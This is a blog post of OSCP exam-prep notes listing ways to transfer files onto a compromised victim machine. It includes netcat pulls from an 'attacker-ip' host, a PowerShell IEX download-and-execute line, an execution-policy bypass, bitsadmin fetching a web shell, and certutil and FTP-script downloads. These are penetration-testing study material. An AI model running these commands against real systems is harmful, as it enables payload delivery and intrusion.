---
layout: post
title:  "File Transfer Techniques"
date:   2018-11-09 10:00:00 +1100
categories: [others]
permalink: /:title:output_ext
comments: true
---

<br>
\-- Another compilation of tips and tricks collected during my OSCP exam prep.<br>

### Linux

**wget**

    wget <URL> -P <local path>

**scp**

    scp <source file> <username>@192.168.xx.xx:/home/<username>/

**ssh**

    ssh HOST cat < LOCALFILE “>” REMOTEFILE

**curl**

    curl -o taglist.zip <Any URL>
    curl -O <URL with file name>

**NC (NetCat)**
\-- Download and host the exploit code on your attacker machine
    
    nc -lvp 6666 < getr00t.c

\-- Download it using the limited shell at your target machine 
    
    nc -nv attacker-ip 6666 > gRoot.c


------

### Windows

**TFTP**

\-- In Kali, create /tftpboot/ directory specifically only for TFTP daemon service
\-- Setup TFTP on Attacker Machine

    atftpd –daemon –port 69 <directory>
    service atftpd start
    cp <file> /tftpboot/

\-- Command on victim machine

    tftp -i <ip address of attacker> GET <file name>

**FTP**

\-- Setup FTP server on attacker machine

    apt-get install pure-ftpd
    setup-ftp
    username: myuser, pswd: lab

\-- Commands on victim machine : Write set of commands in a text file

    echo open X.X.X.X 21> ftp.txt
    echo USER myuser>> ftp.txt
    echo ftp>> ftp.txt
    echo bin >> ftp.txt
    echo GET nc.exe >> ftp.txt
    echo bye >> ftp.txt
    ftp –v -n -s:ftp.txt

**VBScript**<br>
\-- This one is very common and you will see it on many OSCP blog posts .<br>
 
 **Powershell**

\-- Easy way:
    
    powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.1/winenum.bat','C:\inetpub\temp\winenum.bat')
    
\-- Downlaod and Execute:

    powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://attacker-ip/file.exe')
    
\-- Bypassing execution policies 

    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

    
\-- **Weird way:**<br>
\-- On victim machine, write set of commands in a ps1 file

    echo $storageDir = $pwd > wget.ps1
    echo $webclient = New-Object System.Net.WebClient >>wget.ps1
    echo $url = “http://10.xx.xx.xx:8000/Some.exe&#8221; >>wget.ps1
    echo $file = “new-exploit.exe” >>wget.ps1
    echo $webclient.DownloadFile($url,$file) >>wget.ps1

\-- Run wget.ps1 on victim machine

    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
    
<br>
**bitsadmin**<br>

    bitsadmin /transfer debjob /download /priority normal http://<ip>/shell.php c:\xampp\htdocs\shell.php

<br>**cscript**<br>

    cscript wget.vbs http://<ip>/test.txt test.txt


<br>**wget.exe**<br>
\-- Upload to vulnerable server from kali: /usr/share/windows-binaries/wget.exe

    wget.exe http://<ip>/file file

<br>**certutil**<br>

    certutil -urlcache -split -f https://<ip>/file.txt file.txt
    
<br>**EXE2BAT**<br>
\-- Convert EXE to TXT file:

   	root@kali:~/Desktop# locate exe2bat
	/usr/share/windows-binaries/exe2bat.exe
	root@kali:~/Desktop# cp /usr/share/windows-binaries/exe2bat.exe .
	root@kali:~/Desktop# wine exe2bat.exe nc.exe nc.txt
    Finished: nc.exe > nc.txt 

\-- From txt to exe:
    
	root@kali:~/Desktop# cat nc.txt
	echo n 1.dll >123.hex
	echo e 0100 >>123.hex
	echo 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00  >>123.hex 
	echo e 0180 >>123.hex
    .
    .
    .
   	echo q >>123.hex
	debug<123.hex
	copy 1.dll nc_from_binary.exe
